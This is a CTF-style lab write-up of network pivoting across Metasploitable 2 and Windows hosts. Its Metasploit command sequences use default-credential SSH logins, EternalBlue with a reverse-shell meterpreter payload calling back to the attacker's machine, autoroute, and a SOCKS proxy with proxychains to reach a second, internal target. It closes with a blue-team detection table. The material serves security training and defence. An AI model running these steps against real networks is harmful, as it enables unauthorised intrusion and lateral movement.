# CTF Writeup — Pivoting Lab (Multi-Network)

**Dates:** 18–19 May 2026  
**Attacker:** Kali Linux (10.0.2.23)  
**Target 1:** Metasploitable 2 (10.0.2.24 / 192.168.210.115)  
**Target 2:** Metasploitable 2 Clone (192.168.210.116) — not directly reachable  
**Goal:** Compromise Target 1, use it as pivot to reach and exploit Target 2

> ⚠️ Isolated lab environment. No real systems targeted.

---

## Network Topology

```
[Kali] 10.0.2.23
    │
    │ NAT Network
    ▼
[Target 1 — Metasploitable2] 
    eth0: 10.0.2.24      ← reachable from Kali
    eth1: 192.168.210.115 ← internal network
    │
    │ Host-Only (Kali CANNOT reach this directly)
    ▼
[Target 2 — Metasploitable2 Clone]
    eth0: 192.168.210.116 ← unreachable from Kali without pivot
```

---

## Phase 1 — Compromise Target 1

### SSH Brute Force via Metasploit
```bash
msfconsole
search ssh type:auxiliary
use auxiliary/scanner/ssh/ssh_login
options
set RHOSTS 10.0.2.24       # Target 1
set USERNAME msfadmin
set PASSWORD msfadmin
exploit -j

sessions                    # confirm session opened
sessions -u 1               # upgrade shell to meterpreter
sessions                    # now shows meterpreter session
sessions -i 2               # interact with meterpreter
meterpreter> route          # view current routing
meterpreter> background     # back to msfconsole
```

---

## Phase 2 — Add Pivot Routes

```bash
# Back in msfconsole — add routes through compromised session
# NOTE: add routes in msfconsole, NOT in meterpreter

route add 10.0.2.0 255.255.255.0 2         # NAT network route
route add 192.168.210.0 255.255.255.0 2    # Host-only network route
# Format: route add <network_id> <subnet_mask> <session_id>

route    # verify routes added
```

---

## Phase 3 — Discover Target 2 via Pivot

### Ping Sweep Through Pivot
```bash
search ping_sweep
use post/multi/gather/ping_sweep
options
set RHOSTS 192.168.210.0/24    # internal network
set SESSION 2
exploit
# Found: 192.168.210.116 is alive → Target 2
```

### Port Scan Through Pivot
```bash
search portscan
use auxiliary/scanner/portscan/tcp
options
set RHOSTS 192.168.210.116     # Target 2
set PORTS 1-100
exploit
# Found open ports — SSH (22) accessible
```

---

## Phase 4 — Exploit Target 2 Through Pivot

```bash
# Attack Target 2 through the routing pivot
search ssh type:auxiliary
use auxiliary/scanner/ssh/ssh_login
options
set RHOSTS 192.168.210.116    # Target 2
set USERNAME msfadmin
set PASSWORD msfadmin
exploit -j

sessions
# New session opened on Target 2 — routed through Target 1
```

---

## Phase 5 — Windows Pivot with Proxychains (Day 2 — 19 May)

**Setup:**
```
Kali:        NAT Network (10.0.2.23)
Windows T1:  NAT Network (10.0.2.20) + Host-Only (192.168.210.117)
Windows T2:  Host-Only (192.168.210.111)
```

### Compromise Windows Target 1 via EternalBlue
```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOST 10.0.2.20      # Windows T1
set LPORT 5511
set LHOST 10.0.2.23
set SMBUSER forensic
set SMBPASS admin
exploit

meterpreter> route
meterpreter> background
```

### Autoroute — Automatic Pivot Setup
```bash
search autoroute
use post/multi/manage/autoroute
set SESSION 1
exploit
# Automatically adds routes for all networks Target 1 is connected to
```

### Ping Sweep + Port Scan Target 2
```bash
use post/multi/gather/ping_sweep
set RHOSTS 192.168.210.0/24
set SESSION 1
exploit
# Found: 192.168.210.111 (Windows Target 2)

use auxiliary/scanner/portscan/tcp
set PORTS 21,22,139,445
set RHOSTS 192.168.210.111
exploit
# Found: 139, 445 open → SMB
```

### SOCKS Proxy + Proxychains
```bash
# Set up SOCKS proxy in Metasploit
search socks
use auxiliary/server/socks_proxy
exploit -j

jobs    # confirm SOCKS running
route   # confirm routes active
```

```bash
# Terminal 2 — Configure proxychains
mousepad /etc/proxychains4.conf

# Enable dynamic chain (line 10):
dynamic_chain
# Disable strict chain (line 18):
#strict_chain
# Add at end of file:
socks5 127.0.0.1 1080

# Now use proxychains with ANY tool
proxychains nmap -p 21,22,139,445 -sT -n -Pn 192.168.210.111
```

### Exploit Target 2 via Proxychains
```bash
proxychains msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set PAYLOAD windows/x64/meterpreter/bind_tcp    # bind (attacker connects to target)
set RHOST 192.168.210.111    # Windows Target 2
set LPORT 5522
set SMBUSER forensic
set SMBPASS admin
exploit
# Root/SYSTEM access on Target 2 through two hops
```

---

## Pivoting Methods Compared

| Method | Day 1 | Day 2 |
|--------|-------|-------|
| Technique | Manual route + Metasploit only | Autoroute + SOCKS + Proxychains |
| Tools usable | Metasploit modules | Any tool via proxychains |
| Setup | `route add` manual | `autoroute` automatic |
| Flexibility | Low | High |

---

## Key Takeaways

1. **Network segmentation alone is not enough** — a single compromised dual-homed host breaks it
2. **Autoroute** is faster than manual routing — use it first
3. **Proxychains + SOCKS** makes ALL tools pivot-aware, not just Metasploit
4. **Bind payloads** are better for pivoted targets — attacker connects to target, no need for target to route back
5. **Every compromised host is a new network boundary** — always run `ip a` to find hidden interfaces

---

## Blue Team — Detection

| Technique | Detection |
|-----------|-----------|
| SSH brute force | Fail2ban, login failure alerts, rate limiting |
| EternalBlue | Patch MS17-010, disable SMBv1 |
| SOCKS proxy on compromised host | Monitor unusual outbound connections, EDR |
| Lateral movement via pivot | IDS on internal segments, network flow analysis |
| Proxychains usage | Unusual connection patterns from internal hosts |
